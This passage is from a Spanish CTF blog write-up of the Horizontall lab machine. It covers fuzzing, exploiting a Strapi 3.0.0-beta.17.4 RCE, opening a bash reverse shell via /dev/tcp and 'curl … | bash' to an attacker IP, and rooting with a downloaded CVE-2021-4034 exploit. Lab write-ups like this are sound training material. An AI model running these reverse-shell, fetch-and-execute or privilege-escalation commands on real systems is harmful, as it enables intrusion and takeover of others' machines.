+<td><strong>&ndash;hc=404</strong></td>
+<td>Para que no nos reporte los subdirectorios que no existan</td>
+</tr>
+<tr>
+<td><strong>&ndash;hh=854</strong></td>
+<td>Es para que no muestre los subdirectorios con 854 caracteres</td>
+</tr>
+<tr>
+<td><strong>-w</strong></td>
+<td>Es donde se indica el diccionario</td>
+</tr>
+<tr>
+<td><strong>FUZZ</strong></td>
+<td>Se escribe donde se quiere aplicar el diccionario</td>
+</tr>
+</tbody>
+</table></div>
+<!-- raw HTML omitted -->
+<p>El wfuzz a encontrado 3 subdirectorios:</p>
+<ul>
+<li>plugins</li>
+<li>layout</li>
+<li>init</li>
+</ul>
+<p>Al entrar a init vemos lo siguiente</p>
+<pre><code class="language-bash">{&quot;data&quot;:
+{&quot;uuid&quot;:&quot;a55da3bd-9693-4a08-9279-f9df57fd1817&quot;,
+&quot;currentEnvironment&quot;:&quot;development&quot;,
+&quot;autoReload&quot;:false,
+&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;}}
+</code></pre>
+<h3 id="buscar-posible-vulnerabilidad-searchsploit">Buscar posible vulnerabilidad (searchsploit)</h3>
+<p>Ahora tenemos la versión de strapi y con el comando searchsploit se puede buscar si es vulnerable: <code>searchsploit strapi 3.0.0-beta.17.4</code></p>
+<p>Nos muestra los siguientes exploits</p>
+<pre><code class="language-bash">❯ searchsploit strapi 3.0.0-beta.17.4
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Exploit Title                                                                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                 | multiple/webapps/50239.py
+Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                   | nodejs/webapps/50716.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<hr>
+<h2 id="explotación-de-vulnerabilidades">Explotación de Vulnerabilidades</h2>
+<p>Ahora ya sabemos una vulnerabilidad (strapi), strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido</p>
+<p>De los 2 exploits que reporto el serachsploit vamos a usar el que está hecho con python, lo pasamos al directorio actual y después lo ejecutamos</p>
+<pre><code class="language-bash">searchsploit -m 50239.py
+</code></pre>
+<h3 id="ejecutar-exploit">Ejecutar Exploit</h3>
+<pre><code class="language-python">python3 50239.py http://api-prod.horizontall.htb
+</code></pre>
+<p>Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.</p>
+<h3 id="reverse-shell">Reverse shell</h3>
+<ol>
+<li>
+<p>Primero nos ponemos en escucha por el puerto 443 con netcat</p>
+<pre><code class="language-bash">nc -nlvp 443
+</code></pre>
+</li>
+<li>
+<p>Probamos a crear la reverse shell</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
+</code></pre>
+<p>No recibimos nada, Probamos añadiendo el bash -c</p>
+<pre><code class="language-bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1&quot;
+</code></pre>
+<p>Tampoco la pilla, vamos a probar de crear un archivo .png con el comando de bash para la reverse shell, después con un curl lo vamos a mandar a la máquina a través de un servidor creado con python para que después lo ejecute con bash</p>
+<p>Contenido de photo.png</p>
+<pre><code class="language-bash">#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
+</code></pre>
+<p>Abrimos un servidor con python por el puerto 80</p>
+<pre><code class="language-python">python3 -m http.server 80
+</code></pre>
+<p>Por último, en la inyección de comandos que nos dio el exploit, hacemos un curl</p>
+<pre><code>curl http://10.10.14.19/photo.png | bash
+</code></pre>
+</li>
+</ol>
+<p>con un <code>ifconfig</code> confirmamos que estamos en la 10.10.11.105</p>
+<p>¡Ya tenemos una reverse shell!</p>
+<hr>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<h3 id="tratamiento-de-la-tty">Tratamiento de la tty</h3>
+<p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
+<pre><code class="language-bash">script /dev/null -c bash
+</code></pre>
+<p>ctrl + z</p>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<pre><code class="language-bash">reset
+</code></pre>
+<pre><code class="language-bash">xterm
+</code></pre>
+<pre><code class="language-bash">export SHELL=bash
+</code></pre>
+<pre><code class="language-bash">export TERM=xterm
+</code></pre>
+<h3 id="flag-usuario">Flag Usuario</h3>
+<pre><code class="language-bash">cat /home/developer/user.txt
+</code></pre>
+<h3 id="flag-root">Flag Root</h3>
+<p>Después de buscar un rato, he encontrado que es vulnerable a <a class="link" href="https://github.com/berdav/CVE-2021-4034"  target="_blank" rel="noopener"
+    >https://github.com/berdav/CVE-2021-4034</a></p>
+<p>Los pasos para ejecutarlo son:</p>
+<p>Clonar el repositorio de github en nuestra máquina</p>
+<pre><code class="language-bash">git clone https://github.com/berdav/CVE-2021-4034
+</code></pre>
+<p>Lo comprimimos</p>
+<pre><code>zip -r CVE-2021-4034
+</code></pre>
+<p>Desde la máquina víctima y usando el mismo servidor con python de antes lo pasamos con wget</p>
+<pre><code class="language-bash">wget http://10.10.14.19:80/CVE-2021-4034.zip
+
+unzip CVE-2021-4034.zip
+
+cd CVE-2021-4034
+
+make
+
+./cve-2021-4034
+</code></pre>
+<p>Si hacemos un whoami ya somos root!!!</p>
+<p>Para ver la flag hacemos un cat al root.txt</p>
+<pre><code>cat /root/root.txt
+</code></pre>
+<p>¡¡¡Máquina resuelta!!!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/f%C3%A1cil/">Fácil</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/strapi/">Strapi</a>
+        
+            <a href="/tags/cve-2021-4034/">CVE-2021-4034</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-m%C3%A1quina-optimum/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-m%C3%A1quina-optimum/images/3.e7b136aa38d9d53484f7f9219a673a2d_hucc556ac64d77b880b6bd3e5b22138816_1862710_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Máquina Optimum"
+                        
+                        data-hash="md5-57E2qjjZ1TSE9/khmmc6LQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Máquina Optimum</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "d3b0o" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 d3b0o
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
